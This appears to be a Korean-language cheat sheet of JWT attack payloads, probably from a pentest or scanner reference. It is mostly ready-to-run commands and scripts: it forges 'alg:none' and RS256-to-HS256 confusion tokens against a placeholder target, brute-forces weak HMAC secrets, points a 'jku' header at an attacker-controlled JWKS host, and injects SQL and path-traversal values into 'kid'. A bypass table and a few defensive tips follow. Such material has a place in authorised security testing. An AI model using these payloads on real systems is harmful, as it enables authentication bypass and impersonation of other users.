### 정찰 페이로드

#### JWKS endpoint 발견 (RS256→HS256 confusion 사전 단계)
```
curl -s "https://target/.well-known/jwks.json" | jq .
curl -s "https://target/jwks" -o jwks.json
curl -s "https://target/.well-known/openid-configuration" | jq .jwks_uri
curl -s "https://target/oauth2/jwks" | jq .
curl -s "https://target/api/auth/jwks" | jq .
```

#### JWT 토큰 캡처 + 헤더 분석
```bash
# 헤더 디코드
echo "<TOKEN>" | cut -d. -f1 | base64 -d 2>/dev/null | jq .
# {"alg":"RS256","typ":"JWT","kid":"abc"}

# Payload 디코드 (서명 미검증)
echo "<TOKEN>" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
```

#### 알고리즘/kid 종류 enumeration
- 헤더에서 `alg` 확인 (HS256/RS256/ES256/none)
- `kid` 값 형식 확인 (UUID/path/SQL 인젝션 가능 형태)
- `jku`/`jwk` 헤더 사용 여부 확인 (외부 키 신뢰)
- `typ` 값 확인 (`JWT`/`at+jwt`)

---

### 기본 페이로드

**Algorithm None** (`NONE_ALG` 라벨):
```bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"sub":"admin","iat":1700000000}' | base64 -w0 | tr -d '=' | tr '/+' '_-')
curl "https://target/api/protected" -H "Authorization: Bearer $HEADER.$PAYLOAD."

# 대소문자 변형 (대문자 우회)
for alg in "None" "NONE" "nOnE" "noNe"; do
  HEADER=$(echo -n "{\"alg\":\"$alg\",\"typ\":\"JWT\"}" | base64 -w0 | tr -d '=' | tr '/+' '_-')
  curl "https://target/api/protected" -H "Authorization: Bearer $HEADER.$PAYLOAD."
done
```

**Algorithm Confusion RS256→HS256** (`ALG_CONFUSION` 라벨):
```bash
# 정찰 단계에서 획득한 jwks.json → PEM 변환
node -e "
const jwkToPem = require('jwk-to-pem');
const jwk = require('./jwks.json').keys[0];
console.log(jwkToPem(jwk));
" > public.pem

# 공개키를 HS256 시크릿으로 서명
node -e "
const jwt = require('jsonwebtoken');
const pub = require('fs').readFileSync('public.pem');
console.log(jwt.sign({sub:'admin'}, pub, {algorithm:'HS256'}));
"

# 변조 토큰
curl "https://target/api/protected" -H "Authorization: Bearer <CONFUSED_TOKEN>"
```

**약한 시크릿 brute-force** (`WEAK_SECRET` 라벨):
```bash
# jwt-cracker / hashcat
jwt-cracker <TOKEN> -d /path/to/wordlist.txt
hashcat -a 0 -m 16500 token.txt rockyou.txt

# 일반 약한 키 시도 (Node)
node -e "
const crypto = require('crypto');
const keys = ['secret','password','changeme','jwt_secret','key','123456','admin','your-256-bit-secret','default'];
const [h,p,s] = 'CAPTURED.TOKEN.HERE'.split('.');
for (const k of keys) {
  const sig = crypto.createHmac('sha256', k).update(h+'.'+p).digest('base64url');
  if (sig === s) console.log('KEY:', k);
}
"
```

**`jku`/`jwk` 신뢰** (`JKU_TRUST` 라벨):
```
# 공격자 JWKS endpoint로 서명 키 가리키기
HEADER='{"alg":"RS256","jku":"https://attacker/jwks.json","kid":"1"}'
# 공격자 private key로 서명 → 토큰 전송
```

**`kid` injection** (`KID_INJECTION` 라벨):
```bash
# kid를 SQL/path/key lookup으로
HEADER='{"alg":"HS256","kid":"x\\" UNION SELECT \\"mysecret\\"-- "}'  # SQLi
HEADER='{"alg":"HS256","kid":"../../../../dev/null"}'  # /dev/null을 키로 → HMAC 통과
HEADER='{"alg":"HS256","kid":"../../../../etc/hostname"}'  # 임의 파일을 키로
```

**`decode` 미검증 사용** (`UNVERIFIED_DECODE` 라벨):
```bash
HEADER=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64 -w0 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"sub":"admin"}' | base64 -w0 | tr -d '=' | tr '/+' '_-')
# 잘못된 서명이라도 decode만 사용하면 통과
curl "https://target/api/profile" -H "Authorization: Bearer $HEADER.$PAYLOAD.invalidsig"
```

#### `typ` 혼동 (RFC 9068)
```
HEADER='{"alg":"RS256","typ":"JWT"}'  # ID token → access token 용도 재사용
HEADER='{"alg":"RS256","typ":"at+jwt"}'  # access token으로 위장
```

#### Java Psychic Signature (CVE-2022-21449)
```
# Java 15-18 ECDSA 검증 환경
# r=0, s=0 서명 (DER encoded "MAYCAQACAQA=" 같은 값)
# 토큰의 ECDSA signature를 이 값으로
```

#### 만료 토큰 / nbf 미래
```
# exp 만료된 토큰 그대로 사용
curl "https://target/api/protected" -H "Authorization: Bearer EXPIRED_JWT"

# nbf (Not Before) 미래 토큰
PAYLOAD='{"sub":"admin","nbf":2000000000,"iat":2000000000}'
```

#### Embedded JWK 헤더
```
# 토큰 헤더에 공개키 직접 포함 — 누구나 유효 토큰 생성
HEADER='{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}'
```

---

### 우회 페이로드

| 방어 | 우회 |
|---|---|
| `algorithms: ['RS256','HS256']` 혼합 | RS256 공개키를 HS256 시크릿으로 confusion |
| JWKS endpoint 사용자 입력 (`kid`) | 임의 JWKS 가리키기 |
| `exp`만 검증 | `nbf` 미래 토큰, `iat` 조작 |
| 검증 후 `sub`만 사용 | `aud`/`iss` 미체크 → audience confusion (다른 client용 토큰) |
| `jjwt setSigningKey(Object)` 구 API | Object 타입 검증 누락 |
| Java 15-18 ECDSA | `(r=0, s=0)` 서명 통과 |
| `kid` 캐시 (TTL 무한) | stale 키로 회전 전 탈취 키 재사용 |
| `iss` 단일 값 검증 | 다중 IdP 환경에서 다른 IdP 토큰 (mix-up attack) |

---

### 참고사항

- `alg:none` 테스트는 5초 안에 결과 확인 가능 — 가장 먼저 시도
- RS256→HS256 confusion은 public key가 JWKS endpoint에 공개되어 있으면 성공률 높음
- JWKS fetch 위치 확인 — `.well-known/jwks.json`, `/jwks`, `/.well-known/openid-configuration`
- `jku`/`jwk` 헤더 신뢰는 SSRF 결합 — 내부 JWKS endpoint 가리키기
- 하드코딩 시크릿 (`'secret'`, `'changeme'`, `'jwt_secret'`)이 가장 흔한 약점
- Short TTL (5~15분) + refresh token rotation 권장
- DPoP (RFC 9449) token binding은 탈취 토큰 단독 사용 차단
- OAuth access token (`typ: at+jwt`, RFC 9068)와 ID token 혼동 방지 필수
- Psychic Signature는 Java 15-18 한정 — 패치 버전 확인
- 외부 IdP (Auth0/Cognito/Okta)에 완전 위임은 라이브러리 검증 옵션만 확인
- `kid` injection은 SQLi/LFI 변형 — `kid`를 DB 쿼리/파일 경로로 사용 시
- `/dev/null`을 키로 사용하면 HMAC이 빈 키로 계산 → 임의 토큰 통과
- jwt_tool/jwt-cracker/jwt.io 같은 도구로 토큰 분석 가능
- ECDSA P-256 (CVE-2022-21449)은 Java 15-18 환경 — 다른 ECC curve는 영향 없음
- 암호화된 JWE를 JWS로 혼동하면 무결성 보장 안 됨 — AEAD 명시 확인
- `crit` 헤더 (RFC 7515 critical extension)를 무시하는 라이브러리는 의도와 다른 처리
